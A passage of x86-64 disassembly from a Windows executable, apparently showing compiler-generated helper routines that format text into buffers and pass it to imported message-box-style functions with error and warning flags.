   140002623:	56                   	push   %rsi
   140002624:	57                   	push   %rdi
   140002625:	b8 38 20 00 00       	mov    $0x2038,%eax
   14000262a:	e8 91 a2 00 00       	call   0x14000c8c0
   14000262f:	48 2b e0             	sub    %rax,%rsp
   140002632:	48 8b 05 07 ba 03 00 	mov    0x3ba07(%rip),%rax        # 0x14003e040
   140002639:	48 33 c4             	xor    %rsp,%rax
   14000263c:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   140002643:	00 
   140002644:	49 8b f0             	mov    %r8,%rsi
   140002647:	48 63 da             	movslq %edx,%rbx
   14000264a:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002650:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002655:	49 8b e9             	mov    %r9,%rbp
   140002658:	48 8b f9             	mov    %rcx,%rdi
   14000265b:	e8 a0 6d 00 00       	call   0x140009400
   140002660:	44 8b 8c 24 80 20 00 	mov    0x2080(%rsp),%r9d
   140002667:	00 
   140002668:	33 c9                	xor    %ecx,%ecx
   14000266a:	48 85 c0             	test   %rax,%rax
   14000266d:	74 14                	je     0x140002683
   14000266f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002674:	4c 8b c6             	mov    %rsi,%r8
   140002677:	48 8d 14 5a          	lea    (%rdx,%rbx,2),%rdx
   14000267b:	ff 15 97 8d 02 00    	call   *0x28d97(%rip)        # 0x14002b418
   140002681:	eb 0d                	jmp    0x140002690
   140002683:	48 8d 14 3b          	lea    (%rbx,%rdi,1),%rdx
   140002687:	4c 8b c5             	mov    %rbp,%r8
   14000268a:	ff 15 90 8d 02 00    	call   *0x28d90(%rip)        # 0x14002b420
   140002690:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   140002697:	00 
   140002698:	48 33 cc             	xor    %rsp,%rcx
   14000269b:	e8 20 9f 00 00       	call   0x14000c5c0
   1400026a0:	48 81 c4 38 20 00 00 	add    $0x2038,%rsp
   1400026a7:	5f                   	pop    %rdi
   1400026a8:	5e                   	pop    %rsi
   1400026a9:	5d                   	pop    %rbp
   1400026aa:	5b                   	pop    %rbx
   1400026ab:	c3                   	ret
   1400026ac:	cc                   	int3
   1400026ad:	cc                   	int3
   1400026ae:	cc                   	int3
   1400026af:	cc                   	int3
   1400026b0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400026b5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400026ba:	53                   	push   %rbx
   1400026bb:	55                   	push   %rbp
   1400026bc:	56                   	push   %rsi
   1400026bd:	57                   	push   %rdi
   1400026be:	48 83 ec 38          	sub    $0x38,%rsp
   1400026c2:	49 8b f0             	mov    %r8,%rsi
   1400026c5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400026ca:	48 8b da             	mov    %rdx,%rbx
   1400026cd:	48 8b f9             	mov    %rcx,%rdi
   1400026d0:	e8 6b e9 ff ff       	call   0x140001040
   1400026d5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400026da:	4c 8b ce             	mov    %rsi,%r9
   1400026dd:	4c 8b c3             	mov    %rbx,%r8
   1400026e0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400026e7:	00 00 
   1400026e9:	48 8b d7             	mov    %rdi,%rdx
   1400026ec:	48 8b 08             	mov    (%rax),%rcx
   1400026ef:	48 83 c9 01          	or     $0x1,%rcx
   1400026f3:	e8 50 25 01 00       	call   0x140014c48
   1400026f8:	85 c0                	test   %eax,%eax
   1400026fa:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400026ff:	0f 48 c1             	cmovs  %ecx,%eax
   140002702:	48 83 c4 38          	add    $0x38,%rsp
   140002706:	5f                   	pop    %rdi
   140002707:	5e                   	pop    %rsi
   140002708:	5d                   	pop    %rbp
   140002709:	5b                   	pop    %rbx
   14000270a:	c3                   	ret
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002715:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000271a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000271f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002724:	53                   	push   %rbx
   140002725:	55                   	push   %rbp
   140002726:	56                   	push   %rsi
   140002727:	57                   	push   %rdi
   140002728:	41 56                	push   %r14
   14000272a:	b8 40 10 00 00       	mov    $0x1040,%eax
   14000272f:	e8 8c a1 00 00       	call   0x14000c8c0
   140002734:	48 2b e0             	sub    %rax,%rsp
   140002737:	48 8b 05 02 b9 03 00 	mov    0x3b902(%rip),%rax        # 0x14003e040
   14000273e:	48 33 c4             	xor    %rsp,%rax
   140002741:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002748:	00 
   140002749:	48 8b e9             	mov    %rcx,%rbp
   14000274c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002753:	00 
   140002754:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002759:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000275e:	33 f6                	xor    %esi,%esi
   140002760:	e8 0b 2b 01 00       	call   0x140015270
   140002765:	44 8b c8             	mov    %eax,%r9d
   140002768:	4c 8d 05 c9 94 02 00 	lea    0x294c9(%rip),%r8        # 0x14002bc38
   14000276f:	48 8d 05 a2 95 02 00 	lea    0x295a2(%rip),%rax        # 0x14002bd18
   140002776:	8b d3                	mov    %ebx,%edx
   140002778:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000277d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002782:	e8 f9 f4 ff ff       	call   0x140001c80
   140002787:	85 c0                	test   %eax,%eax
   140002789:	78 19                	js     0x1400027a4
   14000278b:	48 63 c8             	movslq %eax,%rcx
   14000278e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002793:	8b f0                	mov    %eax,%esi
   140002795:	48 03 f9             	add    %rcx,%rdi
   140002798:	2b d8                	sub    %eax,%ebx
   14000279a:	b8 00 00 00 00       	mov    $0x0,%eax
   14000279f:	0f 49 c3             	cmovns %ebx,%eax
   1400027a2:	8b d8                	mov    %eax,%ebx
   1400027a4:	48 63 db             	movslq %ebx,%rbx
   1400027a7:	e8 94 e8 ff ff       	call   0x140001040
   1400027ac:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400027b1:	4c 8b cd             	mov    %rbp,%r9
   1400027b4:	4c 8b c3             	mov    %rbx,%r8
   1400027b7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400027be:	00 00 
   1400027c0:	48 8b d7             	mov    %rdi,%rdx
   1400027c3:	48 8b 08             	mov    (%rax),%rcx
   1400027c6:	48 83 c9 02          	or     $0x2,%rcx
   1400027ca:	e8 25 22 01 00       	call   0x1400149f4
   1400027cf:	4c 8d 0d 4a 95 02 00 	lea    0x2954a(%rip),%r9        # 0x14002bd20
   1400027d6:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400027dd:	00 
   1400027de:	4c 8d 05 53 95 02 00 	lea    0x29553(%rip),%r8        # 0x14002bd38
   1400027e5:	8b d6                	mov    %esi,%edx
   1400027e7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400027ec:	e8 2f fe ff ff       	call   0x140002620
   1400027f1:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   1400027f8:	00 
   1400027f9:	48 33 cc             	xor    %rsp,%rcx
   1400027fc:	e8 bf 9d 00 00       	call   0x14000c5c0
   140002801:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002808:	41 5e                	pop    %r14
   14000280a:	5f                   	pop    %rdi
   14000280b:	5e                   	pop    %rsi
   14000280c:	5d                   	pop    %rbp
   14000280d:	5b                   	pop    %rbx
   14000280e:	c3                   	ret
   14000280f:	cc                   	int3
   140002810:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002815:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000281a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000281f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002824:	53                   	push   %rbx
   140002825:	55                   	push   %rbp
   140002826:	56                   	push   %rsi
   140002827:	57                   	push   %rdi
   140002828:	41 56                	push   %r14
   14000282a:	b8 40 20 00 00       	mov    $0x2040,%eax
   14000282f:	e8 8c a0 00 00       	call   0x14000c8c0
   140002834:	48 2b e0             	sub    %rax,%rsp
   140002837:	48 8b 05 02 b8 03 00 	mov    0x3b802(%rip),%rax        # 0x14003e040
   14000283e:	48 33 c4             	xor    %rsp,%rax
   140002841:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002848:	00 
   140002849:	48 8b e9             	mov    %rcx,%rbp
   14000284c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002853:	00 
   140002854:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002859:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000285e:	33 f6                	xor    %esi,%esi
   140002860:	e8 0b 2a 01 00       	call   0x140015270
   140002865:	44 8b c8             	mov    %eax,%r9d
   140002868:	4c 8d 05 d9 93 02 00 	lea    0x293d9(%rip),%r8        # 0x14002bc48
   14000286f:	48 8d 05 e2 94 02 00 	lea    0x294e2(%rip),%rax        # 0x14002bd58
   140002876:	8b d3                	mov    %ebx,%edx
   140002878:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000287d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002882:	e8 29 fe ff ff       	call   0x1400026b0
   140002887:	85 c0                	test   %eax,%eax
   140002889:	78 1a                	js     0x1400028a5
   14000288b:	48 63 c8             	movslq %eax,%rcx
   14000288e:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002893:	2b d8                	sub    %eax,%ebx
   140002895:	8b f0                	mov    %eax,%esi
   140002897:	b8 00 00 00 00       	mov    $0x0,%eax
   14000289c:	0f 49 c3             	cmovns %ebx,%eax
   14000289f:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   1400028a3:	8b d8                	mov    %eax,%ebx
   1400028a5:	48 63 db             	movslq %ebx,%rbx
   1400028a8:	e8 93 e7 ff ff       	call   0x140001040
   1400028ad:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400028b2:	4c 8b cd             	mov    %rbp,%r9
   1400028b5:	4c 8b c3             	mov    %rbx,%r8
   1400028b8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400028bf:	00 00 
   1400028c1:	48 8b d7             	mov    %rdi,%rdx
   1400028c4:	48 8b 08             	mov    (%rax),%rcx
   1400028c7:	48 83 c9 01          	or     $0x1,%rcx
   1400028cb:	e8 78 23 01 00       	call   0x140014c48
   1400028d0:	8b c6                	mov    %esi,%eax
   1400028d2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400028d7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400028dd:	4c 8d 05 54 94 02 00 	lea    0x29454(%rip),%r8        # 0x14002bd38
   1400028e4:	33 c9                	xor    %ecx,%ecx
   1400028e6:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   1400028ea:	ff 15 28 8b 02 00    	call   *0x28b28(%rip)        # 0x14002b418
   1400028f0:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   1400028f7:	00 
   1400028f8:	48 33 cc             	xor    %rsp,%rcx
   1400028fb:	e8 c0 9c 00 00       	call   0x14000c5c0
   140002900:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002907:	41 5e                	pop    %r14
   140002909:	5f                   	pop    %rdi
   14000290a:	5e                   	pop    %rsi
   14000290b:	5d                   	pop    %rbp
   14000290c:	5b                   	pop    %rbx
   14000290d:	c3                   	ret
   14000290e:	cc                   	int3
   14000290f:	cc                   	int3
   140002910:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002915:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000291a:	53                   	push   %rbx
   14000291b:	55                   	push   %rbp
   14000291c:	56                   	push   %rsi
   14000291d:	57                   	push   %rdi
   14000291e:	41 54                	push   %r12
   140002920:	41 55                	push   %r13
   140002922:	41 56                	push   %r14
   140002924:	41 57                	push   %r15
   140002926:	b8 48 10 00 00       	mov    $0x1048,%eax
   14000292b:	e8 90 9f 00 00       	call   0x14000c8c0
   140002930:	48 2b e0             	sub    %rax,%rsp
   140002933:	48 8b 05 06 b7 03 00 	mov    0x3b706(%rip),%rax        # 0x14003e040
   14000293a:	48 33 c4             	xor    %rsp,%rax
   14000293d:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002944:	00 
   140002945:	45 33 ed             	xor    %r13d,%r13d
   140002948:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   14000294d:	41 8b ed             	mov    %r13d,%ebp
   140002950:	4d 8b f0             	mov    %r8,%r14
   140002953:	44 8b e2             	mov    %edx,%r12d
   140002956:	4c 8b f9             	mov    %rcx,%r15
   140002959:	bf 00 10 00 00       	mov    $0x1000,%edi
   14000295e:	e8 0d 29 01 00       	call   0x140015270
   140002963:	44 8b c8             	mov    %eax,%r9d
   140002966:	4c 8d 05 fb 92 02 00 	lea    0x292fb(%rip),%r8        # 0x14002bc68
   14000296d:	8b d7                	mov    %edi,%edx
   14000296f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002974:	e8 07 f3 ff ff       	call   0x140001c80
   140002979:	85 c0                	test   %eax,%eax
   14000297b:	78 17                	js     0x140002994
   14000297d:	48 63 c8             	movslq %eax,%rcx
   140002980:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   140002985:	8b e8                	mov    %eax,%ebp
   140002987:	48 03 f1             	add    %rcx,%rsi
   14000298a:	2b f8                	sub    %eax,%edi
   14000298c:	41 8b c5             	mov    %r13d,%eax
   14000298f:	0f 49 c7             	cmovns %edi,%eax
   140002992:	8b f8                	mov    %eax,%edi
   140002994:	48 63 df             	movslq %edi,%rbx
   140002997:	e8 a4 e6 ff ff       	call   0x140001040
   14000299c:	4d 8b ce             	mov    %r14,%r9
   14000299f:	4c 8b c3             	mov    %rbx,%r8
   1400029a2:	48 8b d6             	mov    %rsi,%rdx
   1400029a5:	48 8b 08             	mov    (%rax),%rcx
   1400029a8:	48 8d 84 24 a8 10 00 	lea    0x10a8(%rsp),%rax
   1400029af:	00 
   1400029b0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400029b5:	48 83 c9 02          	or     $0x2,%rcx
   1400029b9:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400029be:	e8 31 20 01 00       	call   0x1400149f4
   1400029c3:	85 c0                	test   %eax,%eax
   1400029c5:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400029ca:	0f 48 c1             	cmovs  %ecx,%eax
   1400029cd:	85 c0                	test   %eax,%eax
   1400029cf:	78 0c                	js     0x1400029dd
   1400029d1:	48 63 d0             	movslq %eax,%rdx
   1400029d4:	48 03 f2             	add    %rdx,%rsi
   1400029d7:	2b f8                	sub    %eax,%edi
   1400029d9:	41 0f 48 fd          	cmovs  %r13d,%edi
   1400029dd:	41 8b cc             	mov    %r12d,%ecx
   1400029e0:	e8 eb 27 01 00       	call   0x1400151d0
   1400029e5:	48 63 d7             	movslq %edi,%rdx
   1400029e8:	4c 8d 05 89 92 02 00 	lea    0x29289(%rip),%r8        # 0x14002bc78
   1400029ef:	4d 8b cf             	mov    %r15,%r9
   1400029f2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029f7:	48 8b ce             	mov    %rsi,%rcx
   1400029fa:	e8 81 f2 ff ff       	call   0x140001c80
   1400029ff:	4c 8d 0d 1a 93 02 00 	lea    0x2931a(%rip),%r9        # 0x14002bd20
   140002a06:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002a0d:	00 
   140002a0e:	4c 8d 05 23 93 02 00 	lea    0x29323(%rip),%r8        # 0x14002bd38
   140002a15:	8b d5                	mov    %ebp,%edx
   140002a17:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002a1c:	e8 ff fb ff ff       	call   0x140002620
   140002a21:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002a28:	00 
   140002a29:	48 33 cc             	xor    %rsp,%rcx
   140002a2c:	e8 8f 9b 00 00       	call   0x14000c5c0
   140002a31:	48 81 c4 48 10 00 00 	add    $0x1048,%rsp
   140002a38:	41 5f                	pop    %r15
   140002a3a:	41 5e                	pop    %r14
   140002a3c:	41 5d                	pop    %r13
   140002a3e:	41 5c                	pop    %r12
   140002a40:	5f                   	pop    %rdi
   140002a41:	5e                   	pop    %rsi
   140002a42:	5d                   	pop    %rbp
   140002a43:	5b                   	pop    %rbx
   140002a44:	c3                   	ret
   140002a45:	cc                   	int3
   140002a46:	cc                   	int3
   140002a47:	cc                   	int3
   140002a48:	cc                   	int3
   140002a49:	cc                   	int3
   140002a4a:	cc                   	int3
   140002a4b:	cc                   	int3
   140002a4c:	cc                   	int3
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002a55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002a5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002a5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002a64:	53                   	push   %rbx
   140002a65:	55                   	push   %rbp
   140002a66:	56                   	push   %rsi
   140002a67:	57                   	push   %rdi
   140002a68:	41 56                	push   %r14
   140002a6a:	b8 40 10 00 00       	mov    $0x1040,%eax
   140002a6f:	e8 4c 9e 00 00       	call   0x14000c8c0
   140002a74:	48 2b e0             	sub    %rax,%rsp
   140002a77:	48 8b 05 c2 b5 03 00 	mov    0x3b5c2(%rip),%rax        # 0x14003e040
   140002a7e:	48 33 c4             	xor    %rsp,%rax
   140002a81:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002a88:	00 
   140002a89:	48 8b e9             	mov    %rcx,%rbp
   140002a8c:	4c 8d b4 24 78 10 00 	lea    0x1078(%rsp),%r14
   140002a93:	00 
   140002a94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002a99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002a9e:	33 f6                	xor    %esi,%esi
   140002aa0:	e8 cb 27 01 00       	call   0x140015270
   140002aa5:	44 8b c8             	mov    %eax,%r9d
   140002aa8:	4c 8d 05 89 91 02 00 	lea    0x29189(%rip),%r8        # 0x14002bc38
   140002aaf:	48 8d 05 32 92 02 00 	lea    0x29232(%rip),%rax        # 0x14002bce8
   140002ab6:	8b d3                	mov    %ebx,%edx
   140002ab8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002abd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002ac2:	e8 b9 f1 ff ff       	call   0x140001c80
   140002ac7:	85 c0                	test   %eax,%eax
   140002ac9:	78 19                	js     0x140002ae4
   140002acb:	48 63 c8             	movslq %eax,%rcx
   140002ace:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002ad3:	8b f0                	mov    %eax,%esi
   140002ad5:	48 03 f9             	add    %rcx,%rdi
   140002ad8:	2b d8                	sub    %eax,%ebx
   140002ada:	b8 00 00 00 00       	mov    $0x0,%eax
   140002adf:	0f 49 c3             	cmovns %ebx,%eax
   140002ae2:	8b d8                	mov    %eax,%ebx
   140002ae4:	48 63 db             	movslq %ebx,%rbx
   140002ae7:	e8 54 e5 ff ff       	call   0x140001040
   140002aec:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002af1:	4c 8b cd             	mov    %rbp,%r9
   140002af4:	4c 8b c3             	mov    %rbx,%r8
   140002af7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002afe:	00 00 
   140002b00:	48 8b d7             	mov    %rdi,%rdx
   140002b03:	48 8b 08             	mov    (%rax),%rcx
   140002b06:	48 83 c9 02          	or     $0x2,%rcx
   140002b0a:	e8 e5 1e 01 00       	call   0x1400149f4
   140002b0f:	4c 8d 0d da 91 02 00 	lea    0x291da(%rip),%r9        # 0x14002bcf0
   140002b16:	c7 44 24 20 30 00 00 	movl   $0x30,0x20(%rsp)
   140002b1d:	00 
   140002b1e:	4c 8d 05 e3 91 02 00 	lea    0x291e3(%rip),%r8        # 0x14002bd08
   140002b25:	8b d6                	mov    %esi,%edx
   140002b27:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b2c:	e8 ef fa ff ff       	call   0x140002620
   140002b31:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002b38:	00 
   140002b39:	48 33 cc             	xor    %rsp,%rcx
   140002b3c:	e8 7f 9a 00 00       	call   0x14000c5c0
   140002b41:	48 81 c4 40 10 00 00 	add    $0x1040,%rsp
   140002b48:	41 5e                	pop    %r14
   140002b4a:	5f                   	pop    %rdi
   140002b4b:	5e                   	pop    %rsi
   140002b4c:	5d                   	pop    %rbp
   140002b4d:	5b                   	pop    %rbx
   140002b4e:	c3                   	ret
   140002b4f:	cc                   	int3
   140002b50:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002b55:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002b5a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002b5f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002b64:	53                   	push   %rbx
   140002b65:	55                   	push   %rbp
   140002b66:	56                   	push   %rsi
   140002b67:	57                   	push   %rdi
   140002b68:	41 56                	push   %r14
   140002b6a:	b8 40 20 00 00       	mov    $0x2040,%eax
   140002b6f:	e8 4c 9d 00 00       	call   0x14000c8c0
   140002b74:	48 2b e0             	sub    %rax,%rsp
   140002b77:	48 8b 05 c2 b4 03 00 	mov    0x3b4c2(%rip),%rax        # 0x14003e040
   140002b7e:	48 33 c4             	xor    %rsp,%rax
   140002b81:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   140002b88:	00 
   140002b89:	48 8b e9             	mov    %rcx,%rbp
   140002b8c:	4c 8d b4 24 78 20 00 	lea    0x2078(%rsp),%r14
   140002b93:	00 
   140002b94:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002b99:	bb 00 10 00 00       	mov    $0x1000,%ebx
   140002b9e:	33 f6                	xor    %esi,%esi
   140002ba0:	e8 cb 26 01 00       	call   0x140015270
   140002ba5:	44 8b c8             	mov    %eax,%r9d
   140002ba8:	4c 8d 05 99 90 02 00 	lea    0x29099(%rip),%r8        # 0x14002bc48
   140002baf:	48 8d 05 92 91 02 00 	lea    0x29192(%rip),%rax        # 0x14002bd48
   140002bb6:	8b d3                	mov    %ebx,%edx
   140002bb8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002bbd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002bc2:	e8 e9 fa ff ff       	call   0x1400026b0
   140002bc7:	85 c0                	test   %eax,%eax
   140002bc9:	78 1a                	js     0x140002be5
   140002bcb:	48 63 c8             	movslq %eax,%rcx
   140002bce:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002bd3:	2b d8                	sub    %eax,%ebx
   140002bd5:	8b f0                	mov    %eax,%esi
   140002bd7:	b8 00 00 00 00       	mov    $0x0,%eax
   140002bdc:	0f 49 c3             	cmovns %ebx,%eax
   140002bdf:	48 8d 3c 4f          	lea    (%rdi,%rcx,2),%rdi
   140002be3:	8b d8                	mov    %eax,%ebx
   140002be5:	48 63 db             	movslq %ebx,%rbx
   140002be8:	e8 53 e4 ff ff       	call   0x140001040
   140002bed:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002bf2:	4c 8b cd             	mov    %rbp,%r9
   140002bf5:	4c 8b c3             	mov    %rbx,%r8
   140002bf8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002bff:	00 00 
   140002c01:	48 8b d7             	mov    %rdi,%rdx
   140002c04:	48 8b 08             	mov    (%rax),%rcx
   140002c07:	48 83 c9 01          	or     $0x1,%rcx
   140002c0b:	e8 38 20 01 00       	call   0x140014c48
   140002c10:	8b c6                	mov    %esi,%eax
   140002c12:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002c17:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140002c1d:	4c 8d 05 e4 90 02 00 	lea    0x290e4(%rip),%r8        # 0x14002bd08
   140002c24:	33 c9                	xor    %ecx,%ecx
   140002c26:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002c2a:	ff 15 e8 87 02 00    	call   *0x287e8(%rip)        # 0x14002b418
   140002c30:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140002c37:	00 
   140002c38:	48 33 cc             	xor    %rsp,%rcx
   140002c3b:	e8 80 99 00 00       	call   0x14000c5c0
   140002c40:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140002c47:	41 5e                	pop    %r14
   140002c49:	5f                   	pop    %rdi
   140002c4a:	5e                   	pop    %rsi
   140002c4b:	5d                   	pop    %rbp
   140002c4c:	5b                   	pop    %rbx
   140002c4d:	c3                   	ret
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140002c55:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140002c5a:	53                   	push   %rbx
   140002c5b:	55                   	push   %rbp
   140002c5c:	56                   	push   %rsi
   140002c5d:	57                   	push   %rdi
   140002c5e:	41 54                	push   %r12
   140002c60:	41 55                	push   %r13
   140002c62:	41 56                	push   %r14
   140002c64:	41 57                	push   %r15
   140002c66:	b8 58 20 00 00       	mov    $0x2058,%eax
   140002c6b:	e8 50 9c 00 00       	call   0x14000c8c0
   140002c70:	48 2b e0             	sub    %rax,%rsp
   140002c73:	48 8b 05 c6 b3 03 00 	mov    0x3b3c6(%rip),%rax        # 0x14003e040
   140002c7a:	48 33 c4             	xor    %rsp,%rax
   140002c7d:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   140002c84:	00 
   140002c85:	45 33 ed             	xor    %r13d,%r13d
   140002c88:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002c8d:	41 8b ed             	mov    %r13d,%ebp
   140002c90:	4d 8b f8             	mov    %r8,%r15
   140002c93:	44 8b e2             	mov    %edx,%r12d
   140002c96:	4c 8b f1             	mov    %rcx,%r14
   140002c99:	bf 00 10 00 00       	mov    $0x1000,%edi
   140002c9e:	e8 cd 25 01 00       	call   0x140015270
   140002ca3:	44 8b c8             	mov    %eax,%r9d
   140002ca6:	4c 8d 05 d3 8f 02 00 	lea    0x28fd3(%rip),%r8        # 0x14002bc80
   140002cad:	8b d7                	mov    %edi,%edx
   140002caf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002cb4:	e8 f7 f9 ff ff       	call   0x1400026b0
   140002cb9:	85 c0                	test   %eax,%eax
   140002cbb:	78 18                	js     0x140002cd5
   140002cbd:	48 63 c8             	movslq %eax,%rcx
   140002cc0:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   140002cc5:	8b e8                	mov    %eax,%ebp
   140002cc7:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002ccb:	8b cf                	mov    %edi,%ecx
   140002ccd:	2b c8                	sub    %eax,%ecx
   140002ccf:	41 8b fd             	mov    %r13d,%edi
   140002cd2:	0f 49 f9             	cmovns %ecx,%edi
   140002cd5:	48 63 df             	movslq %edi,%rbx
   140002cd8:	e8 63 e3 ff ff       	call   0x140001040
   140002cdd:	4d 8b cf             	mov    %r15,%r9
   140002ce0:	4c 8b c3             	mov    %rbx,%r8
   140002ce3:	48 8b d6             	mov    %rsi,%rdx
   140002ce6:	48 8b 08             	mov    (%rax),%rcx
   140002ce9:	48 8d 84 24 b8 20 00 	lea    0x20b8(%rsp),%rax
   140002cf0:	00 
   140002cf1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002cf6:	48 83 c9 01          	or     $0x1,%rcx
   140002cfa:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140002cff:	e8 44 1f 01 00       	call   0x140014c48
   140002d04:	85 c0                	test   %eax,%eax
   140002d06:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140002d0b:	0f 48 c1             	cmovs  %ecx,%eax
   140002d0e:	85 c0                	test   %eax,%eax
   140002d10:	78 0d                	js     0x140002d1f
   140002d12:	48 63 c8             	movslq %eax,%rcx
   140002d15:	2b f8                	sub    %eax,%edi
   140002d17:	41 0f 48 fd          	cmovs  %r13d,%edi
   140002d1b:	48 8d 34 4e          	lea    (%rsi,%rcx,2),%rsi
   140002d1f:	48 63 d7             	movslq %edi,%rdx
   140002d22:	4c 8d 05 77 8f 02 00 	lea    0x28f77(%rip),%r8        # 0x14002bca0
   140002d29:	4d 8b ce             	mov    %r14,%r9
   140002d2c:	48 8b ce             	mov    %rsi,%rcx
   140002d2f:	e8 7c f9 ff ff       	call   0x1400026b0
   140002d34:	85 c0                	test   %eax,%eax
   140002d36:	78 0d                	js     0x140002d45
   140002d38:	48 63 c8             	movslq %eax,%rcx
   140002d3b:	2b f8                	sub    %eax,%edi
